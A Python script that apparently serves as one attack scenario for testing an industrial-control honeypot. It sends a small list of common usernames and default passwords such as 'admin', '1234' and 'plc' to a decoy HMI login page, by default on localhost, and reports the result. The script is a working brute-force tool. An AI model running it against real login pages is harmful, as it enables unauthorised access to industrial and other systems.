"""
Scenario 4 -- Credential brute-force.

Try a list of common usernames and passwords against the decoy HMI login page,
the way the tool 'hydra' would. The honeypot always rejects the login (there is
nothing real behind it), but it records every attempt.

  python bruteforce_hmi.py <base-url>
"""

import sys

import requests

base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8090"

users = ["admin", "operator"]
passwords = ["admin", "1234", "password", "operator", "plc", "root", "12345", "letmein"]

print(f"[brute] trying {len(users) * len(passwords)} logins against {base}/login")
cracked = None
tries = 0
for user in users:
    for pw in passwords:
        tries += 1
        resp = requests.post(base + "/login", data={"username": user, "password": pw}, timeout=5)
        if resp.status_code == 200 and "invalid" not in resp.text.lower():
            cracked = (user, pw)
            break
    if cracked:
        break

print(f"[brute] {tries} attempts sent.")
print("        result:", f"cracked {cracked}" if cracked else "no valid login (honeypot rejects everything)")
print("        -> every attempt was logged by the decoy HMI")
